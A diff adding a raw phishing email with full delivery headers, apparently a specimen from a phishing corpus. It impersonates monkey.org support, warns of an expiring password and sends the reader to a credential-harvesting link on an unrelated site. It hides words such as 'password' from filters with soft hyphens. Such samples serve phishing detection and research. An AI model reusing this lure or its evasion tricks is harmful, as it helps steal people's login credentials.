@@ -1,0 +1,71 @@
+Return-Path: noreply@ohires.com
+Delivered-To: jose@monkey.org
+X-FDA: 79500876210.37.29CEDA1
+Received: from mail.ohires.com (illuminates.org [78.46.102.152])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 737B31C40B
+	for <jose@monkey.org>; Tue, 24 May 2022 14:31:58 +0000 (UTC)
+Received: from ohires.com (unknown [192.3.239.124])
+	by mail.ohires.com (Postfix) with ESMTPSA id 3D6353CED304
+	for <jose@monkey.org>; Tue, 24 May 2022 16:14:32 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=ohires.com; s=mail;
+	t=1653401672; bh=7//j8dCcfryUnTJ25ZVTZ1hlmDqhytYR3NZAVlcpwrE=;
+	h=From:To:Subject:Date;
+	b=zqtU2TmbPQ0EeD+mbuWJEXExPqbCBuCnXPol5NYl6x2V//Gkv10fyUS4hT/VJAYlv
+	 Jo+2cHGMVfBcuaKJ2/k3kfvkOhO1dd59Wdqi7kXraVzWbKYAlkE4v/r44KlTxrp+em
+	 PRxFMbVns0mqdwPmzXLTpBokfUYYzlit4nSwYofE=
+From: support_monkey.org<noreply@ohires.com>
+To: jose@monkey.org
+Subject: Action Required: your password expires in 48hours
+Date: 24 May 2022 07:14:31 -0700
+Message-ID: <20220524071431.F6DD06E9A7AA9CAA@ohires.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=8.70
+X-Rspamd-Server: rspam01
+X-Rspamd-Queue-Id: 737B31C40B
+X-Stat-Signature: b57u3zjjog3e93itrbupbk3rnwqg6w5i
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=pass header.d=ohires.com header.s=mail header.b=zqtU2Tmb;
+	spf=pass (imf05.b.hostedemail.com: domain of noreply@ohires.com designates 78.46.102.152 as permitted sender) smtp.mailfrom=noreply@ohires.com;
+	dmarc=pass (policy=none) header.from=ohires.com
+X-Rspam-User: 
+X-HE-Tag: 1653402718-541029
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 57
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div>
+<p><font color=3D"#db2a24" size=3D"5">monkey.org</font><br aria-hidden=3D"t=
+rue"><strong><br aria-hidden=3D"true"></strong>Passw&shy;ord for &nbsp;<fon=
+t color=3D"#301fe0">jose@monkey.org&nbsp;<font color=3D"#000000">is d&shy;u=
+e to expire on&nbsp; 5/26/2022 7:14:31 a.m.</font></font><br aria-hidden=3D=
+"true">Use be&shy;low bu&shy;tton to k&shy;eep or update&nbsp;curren&shy;t =
+creden&shy;tials.&nbsp;<br aria-hidden=3D"true"></p>
+<hr size=3D"2">
+
+<table style=3D"border-collapse: collapse !important;" border=3D"0" cellspa=
+cing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td width=3D"180" height=3D"40" align=3D"center" valign=3D"middle" style=3D=
+"white-space: normal !important;" bgcolor=3D"#0077ff">
+<a style=3D'margin: 0px; padding: 0px; border: 0px currentColor; border-ima=
+ge: none; color: rgb(255, 255, 255); line-height: 40px; font-family: "Segoe=
+ UI","Open Sans",Helvetica,Arial,sans-serif; font-size: 16px; text-decorati=
+on: none; vertical-align: baseline; display: block; font-stretch: inherit; =
+background-color: rgb(0, 119, 255);' href=3D"https://stannes.edu.in/2FA.htm=
+l#am9zZUBtb25rZXkub3Jn&target=3D_blank" target=3D"_blank" rel=3D"noopener n=
+oreferrer"=20
+data-auth=3D"NotApplicable" data-linkindex=3D"0">Ke&shy;ep or Up&shy;date</=
+a></td></tr></tbody></table><strong>
+<hr size=3D"2">
+</strong>All Righ&shy;ts Reserved </div></body></html>
+
